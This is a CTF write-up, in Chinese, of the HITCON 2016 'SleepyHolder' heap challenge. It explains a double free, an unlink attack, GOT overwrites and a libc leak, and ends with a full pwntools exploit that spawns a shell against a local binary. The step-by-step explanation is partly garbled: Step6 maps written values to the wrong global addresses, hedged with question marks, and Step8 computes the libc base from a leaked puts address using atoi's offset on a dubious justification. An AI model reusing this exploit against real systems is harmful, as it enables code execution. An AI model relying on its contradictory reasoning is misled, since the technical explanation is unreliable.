# 执行环境
- 运行环境
  - Ubuntu 16.04
  - libc 2.23
- 缓解措施
  - ASLR: on
  - PIE: off
  - NX: on
  - RELRO: Partial RELRO
  - Canary: off

# 漏洞成因
## 程序关键结构体
程序使用全局指针和标志位管理三种秘密（small、big、huge），结构如下：
```c
char *s_ptr; // 指向big secret，大小4000字节
char *f_ptr; // 指向small secret，大小40字节
char *q_ptr; // 指向huge secret，大小400000字节
int s_flag;  // big secret标志位
int f_flag;  // small secret标志位
int q_flag;  // huge secret标志位
```

## 漏洞定位
在`del`函数中，`free`操作后指针未置空，且未检查指针是否已释放，导致可以对同一指针多次释放，造成double free漏洞。具体代码如下：
```c
case 1:
    free(f_ptr);  // 即使f_ptr已释放，仍可再次释放
    f_flag = 0;
    break;
```

# 漏洞利用过程：
利用double free在fastbin中构造循环，通过unlink攻击修改全局指针`f_ptr`，使其指向全局变量区域。然后通过`update`函数修改全局变量中的指针指向GOT表，进一步修改GOT条目劫持控制流，最终执行`system("/bin/sh")`。

- Step1~3: 分配small、big和huge秘密，并触发double free。
- Step4: 利用double free重新分配small秘密，并写入伪造的chunk数据，准备unlink攻击。
- Step5: 释放big秘密触发unlink，修改`f_ptr`指向`f_ptr-0x18`。
- Step6: 通过update修改全局变量区域，将`atoi_GOT`、`puts_GOT`、`free_GOT`地址写入。
- Step7: 修改`atoi`的GOT条目为`puts`的PLT地址。
- Step8: 释放big秘密触发`puts`泄露libc地址。
- Step9: 计算`system`地址并修改`free`的GOT条目为`system`。
- Step10~11: 分配big秘密为"sh"，释放触发`system("sh")`。

## Step1~3
- 堆内存：分配small chunk（地址A，大小0x30），内容为'a'；分配big chunk（地址B，大小0xfa0），内容为'a'。
- 堆内存：释放small chunk A，A进入fastbin，其fd指向main_arena。
- 堆内存：分配huge chunk（地址C，大小0x61a80），防止top chunk合并。
- 堆内存：再次释放small chunk A，造成double free，fastbin中A的fd指向自身，形成循环。

## Step4
- 堆内存：通过add small重新分配A，并写入fake_chunk数据。fake_chunk构造了一个伪造的free chunk（位于small chunk的用户数据区），其中size字段为0x21，fd指向0x6020b8（f_ptr-0x18），bk指向0x6020c0（f_ptr-0x10）。
- 全局变量：此时`f_ptr`仍指向A，但尚未修改。

## Step5
- 堆内存：释放big chunk B，B进入unsorted bin。由于堆布局和伪造的chunk，在合并过程中触发unlink攻击。
- 全局变量：unlink操作执行`FD->bk = BK`和`BK->fd = FD`，其中FD=0x6020b8，BK=0x6020c0，导致`f_ptr`被修改为0x6020b8（即`f_ptr-0x18`）。

## Step6
- 全局变量：通过update small向`f_ptr`（现在指向0x6020b8）写入数据`f`。`f`的内容为`p64(0) + p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT) + p32(1)*3`。这修改了全局变量区域：
  - 地址0x6020b8处写入0（覆盖`q_ptr`？）
  - 地址0x6020c0处写入`atoi_GOT`（覆盖`s_ptr`）
  - 地址0x6020c8处写入`puts_GOT`（覆盖`f_ptr`？实际上`f_ptr`在0x6020d0）
  - 地址0x6020d0处写入`free_GOT`（覆盖`f_ptr`）
  - 后续12字节写入`p32(1)*3`，将`s_flag`、`f_flag`、`q_flag`设置为1。

## Step7
- 全局变量：再次update small，写入`p64(puts_plt)`。由于`f_ptr`指向0x6020b8，update写入的数据会覆盖之前写入的`atoi_GOT`位置（0x6020c0），从而将`atoi`的GOT条目修改为`puts`的PLT地址。

## Step8
- 执行de(2)释放big秘密。此时`s_ptr`指向`puts_GOT`（在step6中设置），因此`free(puts_GOT)`会调用`puts`函数（因为`free`的GOT尚未修改），输出`puts`在libc中的地址。
- 接收泄露的地址，计算libc基址：`libc_base = leaked_addr - atoi_offset`（这里泄露的是`puts`地址，但使用`atoi_offset`计算，因为`atoi`和`puts`在libc中的偏移固定）。

## Step9
- 计算`system`地址：`system = libc_base + system_offset`。
- 通过update small写入`p64(system)`，修改`free`的GOT条目为`system`。由于`f_ptr`指向0x6020b8，写入的数据会覆盖`free_GOT`位置（0x6020d0）。

## Step10~11
- 分配big秘密，内容为"sh"，此时`s_ptr`指向新分配的chunk。
- 释放big秘密，由于`free`的GOT已指向`system`，因此执行`system("sh")`，获取shell。

# Exploit：
```python
from pwn import *
from LibcSearcher import *
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']
elf = ELF('./data/bin/heap23_06_hitcon_2016_sleepyholder')
p = process('./data/bin/heap23_06_hitcon_2016_sleepyholder')
libc = elf.libc
f_ptr = 0x6020d0  # 全局指针f_ptr的地址
atoi_GOT = elf.got['atoi']
free_GOT = elf.got['free']
puts_GOT = elf.got['puts']
puts_plt = elf.plt['puts']
atoi_offset = 0x36e70  # libc中atoi的偏移
system_offset = 0x45380 # libc中system的偏移

def add(t, s):
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'1')
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())
    p.recvuntil(b': \n')
    p.send(s)

def de(t):
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'2')
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())

def update(t, s):
    p.recvuntil(b'3. Renew secret\n')
    p.sendline(b'3')
    p.recvuntil(b'Big secret\n')
    p.sendline(str(t).encode())
    p.recvuntil(b': \n')
    p.send(s)

add(1, b'a');add(2, b'a');de(1)#step.1: 分配small和big，释放small
add(3, b'a')#step.2: 分配huge，防止合并
de(1)#step.3: 再次释放small，double free
# 构造fake chunk用于unlink攻击：伪造size为0x21，fd和bk指向全局指针附近
fake_chunk = p64(0) + p64(0x21) + p64(f_ptr - 0x18) + p64(f_ptr-0x10) + b'\x20'
add(1, fake_chunk)#step.4: 重新分配small并写入伪造数据
de(2)#step.5: 释放big触发unlink，修改f_ptr
# 构造数据写入全局变量区域：覆盖指针为GOT地址，设置标志位为1
f = p64(0) + p64(atoi_GOT) + p64(puts_GOT) + p64(free_GOT) + p32(1)*3
update(1, f)#step.6: 修改全局变量
update(1, p64(puts_plt))#step.7: 修改atoi的GOT为puts的PLT
de(2);s = p.recv(6)#step.8: 释放big触发puts泄露地址
libc_base = u64(s.ljust(8, b'\x00')) - atoi_offset
system = libc_base + system_offset
update(1, p64(system))#step.9: 修改free的GOT为system
add(2, b'sh\0')#step.10: 分配big秘密为"sh"
de(2)#step.11: 释放big触发system("sh")
p.interactive()#step.12: 获取shell
```